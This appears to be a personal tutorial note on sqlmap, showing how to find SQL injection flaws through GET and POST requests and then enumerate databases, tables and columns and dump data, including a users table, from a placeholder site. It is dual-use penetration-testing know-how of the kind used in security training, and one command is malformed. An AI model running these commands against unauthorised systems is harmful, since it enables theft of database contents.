## What is sqlmap?
   sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

## Sqlmap commands

1. To show the basic help menu, simply type `sqlmap -h` in the terminal.
```python
sqlmap -h
```

2. **Basic** commands:
![[sqlmap1.png]]

3. **Enumeration** commands:
   These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.
![[sqlmap2.png]]

4. **Operating System** access commands
   These options can be used to access the back-end database management system on the target operating system.
![[sqlmap3.png]]

**Note** - _the tables shown above aren't all the possible switches to use with sqlmap. For a more extensive list of options, run `sqlmap -hh` to display the advanced help message._

## examples using both GET and POST Method based requests

1. **Simple HTTP GET Based Test**
```python
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```
Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database.

2. **Simple HTTP POST Based Test**
   First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.
![[sqlmap4.png]]
You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.

![[sqlmap5.png]]

**Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:**
```python
sqlmap -r req.txt -p blood_group --dbs
```

```python
sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
```

**Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.**
![[sqlmap6.png]]

##### Now that we have the databases, let's extract tables from the database **blood**.
1. **Using GET based Method**
```python
sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables
```

```python
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
```

2. **Using POST based Method**
```python
sqlmap -r req.txt -p blood_group -D blood --tables
```

```python
sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
```

##### Once we run these commands, we should get the tables.
![[sqlmap7.png]]

##### Once we have available tables, now let’s gather the columns from the table blood_db.
1. **Using GET based Method**
```python
sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns
```

```python
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
```

2. **Using POST based Method**
```python
sqlmap -r req.txt -D blood -T blood_db --columns
```

```python
sqlmap -r req.txt -D <database_name> -T <table_name> --columns
```

![[sqlmap8.png]]

##### Or we can simply dump all the available databases and tables using the following commands.
1. **Using GET based Method**
```python
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
```

```python
sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
```

2. **Using POST based Method**
```python
sqlmap -r req.txt -D <database_name> --dump-all
```

```python
sqlmap -r req.txt-p  -D <database_name> --dump-all
```

```python
sudo sqlmap -r test.txt -p username -D blood -T users --dump
```
